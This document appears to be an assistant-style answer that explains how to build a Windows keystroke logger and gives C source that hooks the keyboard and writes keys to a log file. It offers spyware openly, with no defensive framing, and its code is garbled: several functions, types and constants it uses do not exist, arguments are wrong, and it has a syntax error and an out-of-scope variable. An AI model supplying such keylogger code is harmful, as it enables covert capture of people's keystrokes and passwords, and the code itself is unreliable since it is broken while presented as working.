To create a keystroke logger on a Windows system, follow these steps:

### Step-by-Step Explanation

1. **Include Necessary Headers**: You'll need to include the Windows header files that provide access to the necessary functions and structures.

2. **Define the Keyboard Hook Function**: This function will handle the keyboard events and record the keystrokes.

3. **Set Up the Keyboard Hook**: Use `SetWindowsHook` to attach the hook function to the system.

4. **Attach the Hook**: Attach the hook so it can start processing events.

5. **Process Events**: In a loop, retrieve messages and check if they are keyboard events. If so, log the keystroke.

6. **Clean Up**: Properly remove the hook and release resources to prevent any issues.

Here's the code implementation:

```c
// Include necessary headers
#include <windows.h>
#include <windowsx.h>
#include <stdio.h>

// Function prototype for the keyboard hook
void KeyboardHookProc(int nCode, int wParam, int lParam);

// Main function
int main() {
    // Define the keyboard hook
    FILE *logFile = fopen("keystroke.log", "a");
    if (!logFile) {
        printf("Error: Cannot create file\n");
        return 1;
    }

    // Set up the hook
    HHOOK hook = SetWindowsHook(WH_KEYBOARD_LL, KeyboardHookProc);
    if (hook == NULL) {
        printf("Error: Could not install keyboard hook\n");
        return 1;
    }

    // Attach the hook
    AttachThreadToWindow(GetCurrentThread(), HWND NULL, 0);

    // Process messages
    MSG msg;
    while (GetMessage(&msg, 0)) {
        if (msg.message == WM_KEYDOWN || msg.message == WM_KEYUP) {
            KeyboardHookProc(msg.wParam, msg.lParam);
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Clean up the hook
    UnhookWindowsHook(hook);
    RemoveMessageQueue(GetCurrentWindow());
    fclose(logFile);
    return 0;
}

// Handle keyboard events
void KeyboardHookProc(int nCode, int wParam, int lParam) {
    if (wParam == WH_KEYBOARD_KEYDOWN) {
        // Get the keyboard event parameters
        KBDKEYBOARD_INPUT *keyEvent = (KBDKEYBOARD_INPUT *)lParam;
        char key = keyEvent->wKey;

        // Write to the log file
        fprintf(logFile, "Key pressed: %c\n", key);
    }
}
```

